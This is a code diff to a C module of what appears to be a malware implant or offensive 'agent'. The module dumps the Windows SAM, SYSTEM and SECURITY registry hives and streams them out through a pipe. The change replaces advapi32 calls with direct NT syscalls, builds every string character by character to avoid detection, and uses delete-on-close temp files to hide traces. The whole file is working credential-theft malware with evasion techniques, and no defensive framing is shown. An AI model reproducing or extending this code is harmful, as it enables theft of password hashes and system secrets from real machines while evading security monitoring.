@@ -1,184 +1,202 @@
 /**
- * Registry hive extraction — save SAM/SYSTEM/SECURITY and send via pipe.
- *
- * Uses advapi32 Reg* APIs (resolved at runtime, no import table entry).
- * Enables SeBackupPrivilege so RegSaveKeyW works on protected hives.
- * Temp files are deleted immediately after reading into memory.
+ * Registry hive dump — SAM, SYSTEM, SECURITY via NT syscalls only.
+ * No kernel32/advapi32 dependencies.
+ * Temp files use FILE_DELETE_ON_CLOSE for automatic cleanup.
  */
 
 #include <windows.h>
+#include "../include/ntdefs.h"
+#include "../include/syscalls.h"
 #include "../include/agent.h"
-#include "../include/registry.h"
 
-/* ── advapi32 function types ─────────────────────────────── */
+static inline void zero_mem(void *dst, SIZE_T len) {
+    BYTE *p = (BYTE *)dst;
+    while (len--) *p++ = 0;
+}
 
-typedef LONG  (WINAPI *fn_RegOpenKeyExW)(HKEY, LPCWSTR, DWORD, DWORD, PHKEY);
-typedef LONG  (WINAPI *fn_RegSaveKeyW)(HKEY, LPCWSTR, LPVOID);
-typedef LONG  (WINAPI *fn_RegCloseKey)(HKEY);
-typedef BOOL  (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
-typedef BOOL  (WINAPI *fn_LookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
-typedef BOOL  (WINAPI *fn_AdjustTokenPrivileges)(HANDLE, BOOL, PVOID, DWORD, PVOID, PDWORD);
-
-static fn_RegOpenKeyExW         pRegOpenKeyExW;
-static fn_RegSaveKeyW           pRegSaveKeyW;
-static fn_RegCloseKey           pRegCloseKey;
-static fn_OpenProcessToken      pOpenProcessToken;
-static fn_LookupPrivilegeValueW pLookupPrivilegeValueW;
-static fn_AdjustTokenPrivileges pAdjustTokenPrivileges;
-
-/* ── init ────────────────────────────────────────────────── */
+/* ── Enable SeBackupPrivilege ──────────────────────────────── */
 
 BOOL init_registry(void) {
-    /* Build library name on stack (no string in .rdata) */
-    char lib[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
-    HMODULE adv = LoadLibraryA(lib);
-    if (!adv) return FALSE;
+    HANDLE token = NULL;
+    NTSTATUS status = sys_NtOpenProcessToken(
+        (HANDLE)-1,
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        &token
+    );
+    if (!NT_SUCCESS(status)) return FALSE;
 
-    pRegOpenKeyExW         = (fn_RegOpenKeyExW)        GetProcAddress(adv, "RegOpenKeyExW");
-    pRegSaveKeyW           = (fn_RegSaveKeyW)          GetProcAddress(adv, "RegSaveKeyW");
-    pRegCloseKey           = (fn_RegCloseKey)           GetProcAddress(adv, "RegCloseKey");
-    pOpenProcessToken      = (fn_OpenProcessToken)     GetProcAddress(adv, "OpenProcessToken");
-    pLookupPrivilegeValueW = (fn_LookupPrivilegeValueW)GetProcAddress(adv, "LookupPrivilegeValueW");
-    pAdjustTokenPrivileges = (fn_AdjustTokenPrivileges)GetProcAddress(adv, "AdjustTokenPrivileges");
+    TOKEN_PRIVILEGES tp;
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid.LowPart  = SE_BACKUP_PRIVILEGE_LUID_LOW;
+    tp.Privileges[0].Luid.HighPart = SE_BACKUP_PRIVILEGE_LUID_HIGH;
+    tp.Privileges[0].Attributes    = SE_PRIVILEGE_ENABLED;
 
-    return pRegOpenKeyExW && pRegSaveKeyW && pRegCloseKey &&
-           pOpenProcessToken && pLookupPrivilegeValueW && pAdjustTokenPrivileges;
+    status = sys_NtAdjustPrivilegesToken(token, FALSE, &tp, sizeof(tp), NULL, NULL);
+    sys_NtClose(token);
+
+    return NT_SUCCESS(status);
 }
 
-/* ── privilege ───────────────────────────────────────────── */
+/* ── Build temp file NT path on stack ──────────────────────── */
 
-static BOOL enable_backup_privilege(void) {
-    HANDLE token;
-    /* TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY = 0x0028 */
-    if (!pOpenProcessToken((HANDLE)-1, 0x0028, &token))
-        return FALSE;
+static int build_temp_path(wchar_t *buf, DWORD tick, int index) {
+    int off = 0;
+    buf[off++] = L'\\'; buf[off++] = L'?'; buf[off++] = L'?'; buf[off++] = L'\\';
+    buf[off++] = L'C';  buf[off++] = L':'; buf[off++] = L'\\';
+    buf[off++] = L'W';  buf[off++] = L'i'; buf[off++] = L'n'; buf[off++] = L'd';
+    buf[off++] = L'o';  buf[off++] = L'w'; buf[off++] = L's'; buf[off++] = L'\\';
+    buf[off++] = L'T';  buf[off++] = L'e'; buf[off++] = L'm'; buf[off++] = L'p';
+    buf[off++] = L'\\';
 
-    /* TOKEN_PRIVILEGES with 1 entry */
-    struct {
-        DWORD count;
-        LUID  luid;
-        DWORD attr;
-    } tp;
-    tp.count = 1;
-    tp.attr  = 2; /* SE_PRIVILEGE_ENABLED */
-
-    if (!pLookupPrivilegeValueW(NULL, L"SeBackupPrivilege", &tp.luid)) {
-        CloseHandle(token);
-        return FALSE;
+    for (int i = 28; i >= 0; i -= 4) {
+        int nibble = (tick >> i) & 0xF;
+        buf[off++] = (wchar_t)(nibble < 10 ? L'0' + nibble : L'a' + nibble - 10);
     }
-
-    BOOL ok = pAdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
-    CloseHandle(token);
-    return ok;
+    buf[off++] = (wchar_t)(L'0' + index);
+    buf[off] = L'\0';
+    return off;
 }
 
-/* ── hex helper (for temp file name) ─────────────────────── */
+/* ── Build registry key path on stack ──────────────────────── */
 
-static void dword_to_hex(DWORD val, wchar_t *buf) {
-    const wchar_t hex[] = L"0123456789abcdef";
-    for (int i = 7; i >= 0; i--)
-        *buf++ = hex[(val >> (i * 4)) & 0xF];
-    *buf = L'\0';
+static int build_key_path(wchar_t *buf, const wchar_t *suffix, int suffix_len) {
+    int off = 0;
+    buf[off++] = L'\\';
+    buf[off++] = L'R'; buf[off++] = L'e'; buf[off++] = L'g'; buf[off++] = L'i';
+    buf[off++] = L's'; buf[off++] = L't'; buf[off++] = L'r'; buf[off++] = L'y';
+    buf[off++] = L'\\';
+    buf[off++] = L'M'; buf[off++] = L'a'; buf[off++] = L'c'; buf[off++] = L'h';
+    buf[off++] = L'i'; buf[off++] = L'n'; buf[off++] = L'e'; buf[off++] = L'\\';
+    for (int i = 0; i < suffix_len; i++)
+        buf[off++] = suffix[i];
+    buf[off] = L'\0';
+    return off;
 }
 
-/* ── save one hive, read into memory, delete temp file ───── */
+/* ── Dump one hive ──────────────────────────────────────────── */
 
-static BOOL save_and_read_hive(const wchar_t *key_name, const wchar_t *temp_path,
-                                BYTE **out_data, DWORD *out_size) {
-    *out_data = NULL;
-    *out_size = 0;
+static BOOL dump_one_hive(const wchar_t *key_path, int key_len,
+                          HANDLE pipe, DWORD tick, int index) {
+    UNICODE_STRING key_us;
+    key_us.Length        = (USHORT)(key_len * sizeof(wchar_t));
+    key_us.MaximumLength = (USHORT)((key_len + 1) * sizeof(wchar_t));
+    key_us.Buffer        = (PWSTR)key_path;
 
-    HKEY hKey;
-    /* KEY_READ = 0x20019 */
-    if (pRegOpenKeyExW((HKEY)(ULONG_PTR)0x80000002 /* HKLM */,
-                       key_name, 0, 0x20019, &hKey) != 0)
-        return FALSE;
+    OBJECT_ATTRIBUTES key_oa;
+    InitializeObjectAttributes(&key_oa, &key_us, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    DeleteFileW(temp_path);
-    LONG rc = pRegSaveKeyW(hKey, temp_path, NULL);
-    pRegCloseKey(hKey);
-    if (rc != 0) return FALSE;
-
-    /* Read file into memory */
-    HANDLE hFile = CreateFileW(temp_path, GENERIC_READ, FILE_SHARE_READ,
-                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        DeleteFileW(temp_path);
+    HANDLE hKey = NULL;
+    NTSTATUS status = sys_NtOpenKey(&hKey, KEY_READ, &key_oa);
+    if (!NT_SUCCESS(status)) {
+        DWORD zero = 0;
+        write_pipe(pipe, &zero, 4);
         return FALSE;
     }
 
-    DWORD file_size = GetFileSize(hFile, NULL);
-    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
-        CloseHandle(hFile);
-        DeleteFileW(temp_path);
+    wchar_t temp_path[64];
+    int temp_len = build_temp_path(temp_path, tick, index);
+
+    UNICODE_STRING file_us;
+    file_us.Length        = (USHORT)(temp_len * sizeof(wchar_t));
+    file_us.MaximumLength = (USHORT)((temp_len + 1) * sizeof(wchar_t));
+    file_us.Buffer        = temp_path;
+
+    OBJECT_ATTRIBUTES file_oa;
+    InitializeObjectAttributes(&file_oa, &file_us, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    IO_STATUS_BLOCK iosb;
+    HANDLE hFile = NULL;
+    status = sys_NtCreateFile(
+        &hFile,
+        0xC0110000, /* GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE */
+        &file_oa, &iosb, NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        0,
+        FILE_OVERWRITE_IF,
+        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE,
+        NULL, 0
+    );
+    if (!NT_SUCCESS(status)) {
+        sys_NtClose(hKey);
+        DWORD zero = 0;
+        write_pipe(pipe, &zero, 4);
         return FALSE;
     }
 
-    BYTE *data = (BYTE *)VirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!data) {
-        CloseHandle(hFile);
-        DeleteFileW(temp_path);
+    status = sys_NtSaveKey(hKey, hFile);
+    sys_NtClose(hKey);
+    if (!NT_SUCCESS(status)) {
+        sys_NtClose(hFile);
+        DWORD zero = 0;
+        write_pipe(pipe, &zero, 4);
         return FALSE;
     }
 
-    DWORD total = 0;
-    while (total < file_size) {
-        DWORD chunk = 0;
-        if (!ReadFile(hFile, data + total, file_size - total, &chunk, NULL) || chunk == 0)
-            break;
-        total += chunk;
-    }
-    CloseHandle(hFile);
-    DeleteFileW(temp_path);
-
-    if (total != file_size) {
-        VirtualFree(data, 0, MEM_RELEASE);
+    FILE_STANDARD_INFORMATION fsi;
+    zero_mem(&fsi, sizeof(fsi));
+    status = sys_NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi),
+                                         FileStandardInformation);
+    if (!NT_SUCCESS(status) || fsi.EndOfFile.QuadPart == 0) {
+        sys_NtClose(hFile);
+        DWORD zero = 0;
+        write_pipe(pipe, &zero, 4);
         return FALSE;
     }
 
-    *out_data = data;
-    *out_size = file_size;
-    return TRUE;
+    DWORD file_size = (DWORD)fsi.EndOfFile.QuadPart;
+    write_pipe(pipe, &file_size, 4);
+
+    PVOID buf = NULL;
+    SIZE_T buf_size = 65536;
+    status = sys_NtAllocateVirtualMemory((HANDLE)-1, &buf, 0, &buf_size,
+                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!NT_SUCCESS(status)) {
+        sys_NtClose(hFile);
+        return FALSE;
+    }
+
+    LARGE_INTEGER offset;
+    offset.QuadPart = 0;
+    DWORD remaining = file_size;
+
+    while (remaining > 0) {
+        DWORD to_read = remaining > 65536 ? 65536 : remaining;
+        IO_STATUS_BLOCK read_iosb;
+        status = sys_NtReadFile(hFile, NULL, NULL, NULL, &read_iosb,
+                                buf, to_read, &offset, NULL);
+        if (!NT_SUCCESS(status)) break;
+        DWORD bytes_read = (DWORD)read_iosb.Information;
+        if (bytes_read == 0) break;
+        write_pipe(pipe, buf, bytes_read);
+        offset.QuadPart += bytes_read;
+        remaining -= bytes_read;
+    }
+
+    SIZE_T free_size = 0;
+    sys_NtFreeVirtualMemory((HANDLE)-1, &buf, &free_size, MEM_RELEASE);
+    sys_NtClose(hFile);
+
+    return remaining == 0;
 }
 
-/* ── main entry: dump all 3 hives through the pipe ───────── */
+/* ── Dump all three hives ──────────────────────────────────── */
 
 BOOL dump_registry_hives(HANDLE pipe) {
-    enable_backup_privilege();
+    DWORD tick = get_tick();
+    wchar_t path[64];
+    int len;
 
-    /* Build unique temp paths from GetTickCount */
-    wchar_t prefix[] = L"C:\\Windows\\Temp\\";
-    wchar_t hex[9];
-    dword_to_hex(GetTickCount(), hex);
+    wchar_t s0[] = { L'S', L'Y', L'S', L'T', L'E', L'M' };
+    len = build_key_path(path, s0, 6);
+    dump_one_hive(path, len, pipe, tick, 0);
 
-    wchar_t sys_path[64], sam_path[64], sec_path[64];
-    /* Manually concatenate: prefix + hex + "_s" / "_a" / "_e" */
-    int pi = 0;
-    while (prefix[pi]) { sys_path[pi] = sam_path[pi] = sec_path[pi] = prefix[pi]; pi++; }
-    int hi = 0;
-    while (hex[hi]) { sys_path[pi+hi] = sam_path[pi+hi] = sec_path[pi+hi] = hex[hi]; hi++; }
-    int off = pi + hi;
-    sys_path[off] = L's'; sys_path[off+1] = L'\0';
-    sam_path[off] = L'a'; sam_path[off+1] = L'\0';
-    sec_path[off] = L'e'; sec_path[off+1] = L'\0';
+    wchar_t s1[] = { L'S', L'A', L'M' };
+    len = build_key_path(path, s1, 3);
+    dump_one_hive(path, len, pipe, tick, 1);
 
-    /* Save and send each hive: SYSTEM, SAM, SECURITY */
-    const wchar_t *keys[]  = { L"SYSTEM",  L"SAM",  L"SECURITY" };
-    const wchar_t *paths[] = { sys_path,   sam_path, sec_path    };
-
-    for (int i = 0; i < 3; i++) {
-        BYTE *data = NULL;
-        DWORD size = 0;
-
-        if (save_and_read_hive(keys[i], paths[i], &data, &size) && data) {
-            write_pipe(pipe, &size, 4);
-            write_pipe(pipe, data, size);
-            VirtualFree(data, 0, MEM_RELEASE);
-        } else {
-            DWORD zero = 0;
-            write_pipe(pipe, &zero, 4);
-        }
-    }
+    wchar_t s2[] = { L'S', L'E', L'C', L'U', L'R', L'I', L'T', L'Y' };
+    len = build_key_path(path, s2, 8);
+    dump_one_hive(path, len, pipe, tick, 2);
 
     return TRUE;
 }
